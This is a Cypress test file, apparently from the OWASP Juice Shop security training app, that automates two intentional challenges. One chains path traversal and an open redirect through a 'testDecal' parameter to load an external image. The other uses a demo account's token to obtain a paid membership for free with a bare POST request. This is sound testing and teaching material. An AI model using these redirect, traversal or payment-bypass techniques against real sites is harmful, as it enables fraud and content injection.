describe('/#/deluxe-membership', () => {
  describe('challenge "svgInjection"', () => {
    it('should be possible to pass in a forgotten test parameter abusing the redirect-endpoint to load an external image', () => {
      cy.login({ email: 'jim', password: 'ncc-1701' })
      cy.location().then((loc) => {
        cy.visit(
          `/#/deluxe-membership?testDecal=${encodeURIComponent(
            `../../..${loc.pathname}/redirect?to=https://placekitten.com/g/200/100?x=https://github.com/juice-shop/juice-shop`
          )}`
        )
      })

      cy.expectChallengeSolved({ challenge: 'Cross-Site Imaging' })
    })
  })

  describe('challenge "freeDeluxe"', () => {
    it('should upgrade to deluxe for free by making a post request to /rest/deluxe-membership by setting the paymentMode parameter to null', () => {
      cy.login({
        email: 'jim',
        password: 'ncc-1701'
      })
      cy.visit('/#/')
      cy.getCookie('token').then((token) => {
        cy.request({
          url: '/rest/deluxe-membership',
          method: 'POST',
          headers: { Authorization: `Bearer ${token?.value}` }
        }).then((response) => {
          expect(response.body.status).contains('success')
        })
      })
      cy.expectChallengeSolved({ challenge: 'Deluxe Fraud' })
    })
  })
})
